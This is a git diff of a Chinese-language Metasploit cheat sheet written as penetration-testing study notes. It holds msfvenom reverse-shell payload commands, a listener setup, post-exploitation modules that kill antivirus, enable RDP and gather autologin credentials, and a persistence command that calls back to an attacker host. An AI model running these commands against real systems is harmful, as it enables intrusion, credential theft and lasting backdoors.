@@ -6,7 +6,7 @@ title: Metasploit漏洞利用框架
 
 ## Metasploit模块划分
 
-MSF是渗透测试领域最流行的渗透测试框架，它有以下几个模块：
+MSF是渗透测试领域最流行的渗透测试框架，其中msf为总模块，其他均为分支模块。分支模块如下：
 
 > 辅 助 模 块 (Auxiliary，扫描器)，扫描主机系统，寻找可用漏洞；
 >
@@ -33,7 +33,7 @@ exploit			#执行渗透攻击
 ## 参数摘要
 
 ```bash
-reload_all		#从目录重载所有模块
+reload_all		#从目录重载所有模块。导入模块也需要用到此命令。
 back	#后退命令，移出当前上下文，用于模块切换
 info	#目标和模块详细信息
 check	#检查目标是否受某个漏洞影响
@@ -52,7 +52,12 @@ show options	#显示可选选项
 	 targets	#显示所有可用目标
 	 advanced	#显示更多高级选项
 	 encoders	#显示可用编码器列表
+	 
+unset [Module Options]    #清除Module Options
 ```
+## 导入模块
+模块的命名不能有-，可以用_代替。
+reload_all		#从目录重载所有模块。导入模块也需要用到此命令。
 
 # 使用辅助模块（Auxiliary）
 
@@ -117,27 +122,56 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=Kali的IP LPORT=Kali监听
 ```bash
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.1.1.15 LPORT=6666 -f elf > msf.elf
 ```
+# 后渗透模块（Post）
+
+```bash
+run post/windows/gather/checkvm		#检查目标是否虚拟机
+run post/linux/gather/checkvm
+run post/windows/manage/killav		#关闭杀软
+run post/windows/manage/enable_rdp	#开启目标远程桌面
+run post/windows/gather/enum_logged_on_users	#列举当前登陆用户，和最近登陆过的用户
+run post/windows/gather/enum_applications		#列举应用程序
+run windows/gather/credentials/windows_autologin#列举自动登陆的用户名和密码
+```
+
+MSF官方后渗透模块参考：https://www.offensive-security.com/metasploit-unleashed/post-module-reference/ 
 
 # 监听反弹shell
 
 ```bash
 msf5 > use exploit/multi/handler
-msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
+msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp    #payload要和持久化所用模块的payload对应
 msf5 exploit(multi/handler) > set LHOST 10.1.1.15
 msf5 exploit(multi/handler) > set LPORT 6666
 msf5 exploit(multi/handler) > run
 ```
 
-# Meterpreter用例
-
+# Meterpreter
+## 持久化
  刚获得`Meterpreter Shell`时，该Shell是极其脆弱的，可以把它和目标机中一个稳定的程序绑定
-
+ 
+ NT AUTHORITY\SYSTEM 這個帳號通常是隱藏的，就是傳說中的Windows至高無上權限帳號，跟Administrators擁有相同文件權限
+ 
 ```bash
 getpid			#查看当前Meterpreter Shell的进程号
 ps				#获取目标机正运行的进程
 migrate 476		#将shell迁移到PID为786的进程中
 ```
+## Persistence模块
+```bash
+run persistence -h    #查看persistence模块帮助信息、参数。
 
+#举例
+run persistence -X -i 10 -p 12397 -r 192.168.34.132    
+#若监听时一直报错，换个监听端口即可。
+[*] Started reverse TCP handler on 10.100.130.180:4444 
+[-] Command shell session 1 is not valid and will be closed 
+[*] 10.100.131.192 - Command shell session 1 closed. 
+[-] Command shell session 2 is not valid and will be closed 
+[*] 10.100.131.192 - Command shell session 2 closed. 
+[-] Command shell session 3 is not valid and will be closed 
+[*] 10.100.131.192 - Command shell session 3 closed.
+```
 ## 命令摘要
 
 ```bash
@@ -169,19 +203,7 @@ sudo rdesktop -f 目标IP
 route add IP 子网掩码    #添加路由，先background
 ```
 
-# 后渗透模块（Post）
 
-```bash
-run post/windows/gather/checkvm		#检查目标是否虚拟机
-run post/linux/gather/checkvm
-run post/windows/manage/killav		#关闭杀软
-run post/windows/manage/enable_rdp	#开启目标远程桌面
-run post/windows/gather/enum_logged_on_users	#列举当前登陆用户，和最近登陆过的用户
-run post/windows/gather/enum_applications		#列举应用程序
-run windows/gather/credentials/windows_autologin#列举自动登陆的用户名和密码
-```
-
-MSF官方后渗透模块参考：https://www.offensive-security.com/metasploit-unleashed/post-module-reference/ 
 
 # 网络穿透
 
@@ -201,7 +223,8 @@ meterpreter > run autoroute -p		#列出添加了路由规则的存活session
  添加完成后返回上一层，这里一定要保证添加了路由规则的sessions的存活,如果sessions掉了对应的路由规则也就失效了
 
  添加完成后使用ms17_010的扫描脚本进行目标内网的扫描
-
+# 插件
+若要使用get shell提示音，可以使用 sounds plugin.
 # MSF靶机
 
 **Metasploitable2：**
